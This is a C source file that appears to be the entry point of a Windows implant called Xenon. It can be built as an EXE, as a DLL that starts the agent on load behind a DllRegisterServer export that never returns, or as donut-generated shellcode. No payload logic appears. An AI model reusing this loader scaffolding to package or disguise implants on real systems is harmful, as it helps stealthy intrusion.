#include "Xenon.h"
#include "Config.h"

#ifdef _EXE
int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR szArgs, _In_ int nCmdShow)
{
    XenonMain();

    return 0;
}
#else

#ifndef _SHELLCODE
/*
    Shellcode is currently created by compiling a DLL and running donut-shellcode
    on it. 
    In order for the Dll to continue to run from the bootstrap donut loader, it requires an 
    exported function. This just keeps the process open.
*/

// Default DLL export name
#ifndef DLL_EXPORT_FUNC
#define DLL_EXPORT_FUNC DllRegisterServer
#endif

__declspec(dllexport) 
VOID APIENTRY DLL_EXPORT_FUNC(VOID)
{
    // Long sleeping loop to keep the process running
    while (TRUE) {
        Sleep(24 * 60 * 60 * 1000);
    }
}
#endif


__declspec(dllexport)
BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved)
{
    HANDLE hThread = NULL;
    
    switch (reason) {
        case DLL_PROCESS_ATTACH:
        {

        /*
            Debugging plain DLL w/ console
        */
        #if !defined(_SHELLCODE) && defined(_MANUAL) || defined(_DEBUG)
            AllocConsole();
            freopen( "CONOUT$", "w", stdout );
        #endif


        #ifdef _SHELLCODE
            // Just call the main function
            XenonMain();
        #else
            // If using DLL, need to create a new thread
            hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)XenonMain, NULL, 0, NULL);
            // CloseHandle(hThread);
        #endif
            return TRUE;
        }
    }
}
#endif